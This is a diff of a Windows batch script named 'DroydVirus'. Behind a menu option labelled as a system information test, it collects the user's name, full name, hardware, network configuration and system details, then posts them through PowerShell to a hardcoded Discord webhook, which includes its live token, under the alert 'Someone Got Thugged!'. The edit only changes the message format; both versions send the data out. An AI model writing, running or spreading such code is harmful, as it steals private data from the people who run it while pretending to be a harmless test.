@@ -23,7 +23,7 @@ goto :continueScript
 :: Show the menu for "adisa" and "princ"
 :showMenu
 cls
-echo Welcome to DroydVirus, To Whom i name as "owner"! 
+echo Welcome to DroydVirus, %user_name%! 
 echo.
 echo Please choose an option:
 echo 1. Run system information test
@@ -65,19 +65,13 @@ for /f "tokens=*" %%a in ('wmic memorychip get capacity') do set "raminfo=%%a"
 for /f "tokens=*" %%a in ('wmic useraccount where name="%user_name%" get fullname') do set "userfullname=%%a"
 
 :: Format the message with better structure and additional info
-set "message=\
-**Alert: Unauthorized Access Detected!**%n%\
-Here is the detailed system information:%n%n\
-**User:** %user_name%%n%\
-**Full Name:** %userfullname%%n%\
-**System Model:** %systemmodel%%n%\
-**CPU:** %cpuinfo%%n%\
-**RAM Capacity:** %raminfo%%n%\
-**Network Configuration:** %networkinfo%%n%\
-**System Information:** %sysinfo%"
+set "message=^
+{^
+  \"content\": \"**Alert: Someone Got Thugged! **\nHere is the detailed system information:\n\n**User:** %user_name%\n**Full Name:** %userfullname%\n**System Model:** %systemmodel%\n**CPU:** %cpuinfo%\n**RAM Capacity:** %raminfo%\n**Network Configuration:** %networkinfo%\n**System Information:** %sysinfo%\"^
+}"
 
 :: Send information to Discord webhook with better formatting and content type
-powershell -Command "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1337159633239937115/KdOhG-AXg3ckXDIrmcWESldNObYb5dZ16S8F591bs12XlwFC7M_l754ukBqeyhvXcJwY' -Method Post -Body '{\"content\": \"%message%\"}' -ContentType 'application/json'"
+powershell -Command "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1337159633239937115/KdOhG-AXg3ckXDIrmcWESldNObYb5dZ16S8F591bs12XlwFC7M_l754ukBqeyhvXcJwY' -Method Post -Body '%message%' -ContentType 'application/json'"
 
 :: Return to main menu after the test
 pause
